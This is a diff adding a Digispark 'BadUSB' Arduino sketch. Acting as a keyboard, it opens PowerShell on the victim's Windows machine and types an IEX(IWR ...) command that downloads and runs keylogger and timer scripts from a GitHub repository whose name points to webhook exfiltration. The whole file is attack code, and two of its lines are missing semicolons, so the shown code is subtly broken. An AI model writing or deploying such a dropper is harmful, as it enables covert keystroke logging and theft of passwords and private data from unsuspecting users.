@@ -1,0 +1,21 @@
+#include "DigiKeyboard.h"
+void setup() {
+  DigiKeyboard.sendKeyStroke(0);
+ DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_R);
+DigiKeyboard.delay(200);
+DigiKeyboard.print("powershell");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(300);
+DigiKeyboard.print("cd $env:temp")
+DigiKeyboard.delay(300)
+DigiKeyboard.print("IEX(IWR https://raw.githubusercontent.com/ISykeI/Digispark_Keylogger_Webhook/main/keylog.ps1 -UseBasicParsing); Invoke-keylog;IEX(IWR https://raw.githubusercontent.com/ISykeI/Digispark_Keylogger_Webhook/main/time.ps1 -UseBasicParsing); Invoke-time; exit");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+for(;;){ /*empty*/ };
+}
+
+void loop() {
+
+
+}
